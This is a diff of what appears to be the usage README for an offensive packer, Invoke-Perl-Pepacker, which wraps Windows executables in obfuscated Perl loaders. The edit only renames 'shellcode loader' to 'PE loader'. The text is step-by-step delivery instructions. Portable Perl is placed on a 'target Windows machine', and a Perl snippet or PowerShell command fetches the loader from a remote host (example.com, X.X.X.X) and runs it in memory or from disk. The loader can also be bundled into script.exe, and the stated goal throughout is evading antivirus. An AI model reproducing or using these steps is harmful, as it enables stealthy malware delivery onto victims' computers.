@@ -29,7 +29,7 @@ C:\path\perl\bin> dir
 05/11/2025  02:49 PM            46,592 perl.exe
 <SNIP>
 
-C:\path\perl\bin> perl.exe .\Invoke-Perl-Pepacker.pl PE-to-pack.exe obfuscated_PEloader_script.pl
+C:\path\perl\bin> perl.exe .\Invoke-Perl-Pepacker.pl PE-to-pack.exe obfuscated_PEloader.pl
 
 ```
 
@@ -44,14 +44,14 @@ C:\path\perl\bin> perl.exe .\Invoke-Perl-Pepacker.pl PE-to-pack.exe obfuscated_P
     PS C:\temp> wget -uri https://github.com/StrawberryPerl/Perl-Dist-Strawberry/releases/download/SP_54021_64bit_UCRT/strawberry-perl-5.40.2.1-64bit-portable.zip -OutFile C:\temp\perl.zip
     PS C:\temp> tar -xf .\perl.zip
 
-2 - Download from a remote web server and execute directly in memory the obfuscated shellcode loader script on the target Windows machine using Perl.
+2 - Download from a remote web server and execute directly in memory the obfuscated PE loader script on the target Windows machine using Perl.
     This fileless delivery technique enhances stealth and helps evade static antivirus detection.
     Example:
     --------
     C:\temp\perl-portable\perl\bin> type .\Perl-fileless-delivery.pl
     #Perl
     use LWP::Simple;
-    my $url = 'http://example.com/obfuscated_shellcodeloader.pl';
+    my $url = 'http://example.com/obfuscated_PEloader.pl';
     my $script = get($url);
     eval $script;
 
@@ -66,22 +66,22 @@ C:\path\perl\bin> perl.exe .\Invoke-Perl-Pepacker.pl PE-to-pack.exe obfuscated_P
     PS C:\temp> wget -uri https://github.com/StrawberryPerl/Perl-Dist-Strawberry/releases/download/SP_54021_64bit_UCRT/strawberry-perl-5.40.2.1-64bit-portable.zip -OutFile C:\temp\perl.zip
     PS C:\temp> tar -xf .\perl.zip
 
-2 - Download and store the obfuscated shellcode loader script locally on disk before executing it with Perl.
+2 - Download and store the obfuscated PE loader script locally on disk before executing it with Perl.
     While obfuscation and encryption help evade static analysis by most antivirus solutions, this approach may offer reduced stealth compared to in-memory execution.
     Example:
     --------
-    C:\temp\perl-portable\perl\bin> powershell -c "wget -uri http://X.X.X.X/obfuscated_shellcodeloader.pl -OutFile C:\temp\perl-portable\perl\bin\obfuscated_shellcodeloader.pl"
-    C:\temp\perl-portable\perl\bin> perl.exe .\obfuscated_shellcodeloader.pl
+    C:\temp\perl-portable\perl\bin> powershell -c "wget -uri http://X.X.X.X/obfuscated_PEloader.pl -OutFile C:\temp\perl-portable\perl\bin\obfuscated_PEloader.pl"
+    C:\temp\perl-portable\perl\bin> perl.exe .\obfuscated_PEloader.pl
 ```
   - Option C (not recommended): Use Perl2Exe or "Strawberry Perl + PAR::Packer" to bundle the obfuscated PE loader Perl script into a single executable (e.g. script.exe) and then download and execute it on a target Windows computer
 ```
-1 - Bundle the obfuscated shellcode loader Perl script into a single executable (e.g. script.exe)
+1 - Bundle the obfuscated PE loader Perl script into a single executable (e.g. script.exe)
     Example with "Strawberry Perl + PAR::Packer":
     ---------------------------------------------
     C:\path\perl\bin> set PAR_VERBATIM=1
-    C:\path\perl\bin> pp -o script.exe -M MIME::Base64 -M Compress::Zlib obfuscated_shellcodeloader.pl
+    C:\path\perl\bin> pp -o script.exe -M MIME::Base64 -M Compress::Zlib obfuscated_PEloader.pl
 
-2 - Download and execute the obfuscated shellcode loader "script.exe" on a target Windows computer
+2 - Download and execute the obfuscated PE loader "script.exe" on a target Windows computer
     Important note => Many antivirus products (including Windows Defender) detect as malicious perl script embeded in "exe" file.
     Example:
     --------
